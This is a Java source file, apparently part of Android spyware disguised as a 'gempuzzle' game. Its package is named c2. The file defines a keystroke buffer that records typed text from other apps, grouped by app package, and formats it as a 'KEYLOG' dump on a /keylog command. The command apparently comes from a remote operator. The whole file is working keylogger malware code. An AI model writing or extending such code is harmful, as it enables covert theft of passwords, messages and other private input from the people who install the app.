package com.gempuzzle.quest.c2;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * In-memory keystroke buffer — grouped by package.
 * Flushed on /keylog command.
 */
public final class KeystoreBuffer {

    private static final Map<String, List<String>> logs = new HashMap<>();
    private static final int MAX_PER_APP = 500;

    public static synchronized void log(String pkg, String text) {
        List<String> list = logs.computeIfAbsent(pkg, k -> new ArrayList<>());
        list.add(text);
        while (list.size() > MAX_PER_APP) list.remove(0);
    }

    public static synchronized String dump() {
        if (logs.isEmpty()) return "_no keystrokes recorded_";
        StringBuilder sb = new StringBuilder("⌨ *KEYLOG*\n\n");
        for (Map.Entry<String, List<String>> e : logs.entrySet()) {
            sb.append("📱 `").append(e.getKey()).append("`\n");
            for (String s : e.getValue()) sb.append("  ").append(s).append("\n");
            sb.append("\n");
        }
        return sb.toString();
    }

    public static synchronized void clear() {
        logs.clear();
    }

    private KeystoreBuffer() {}
}
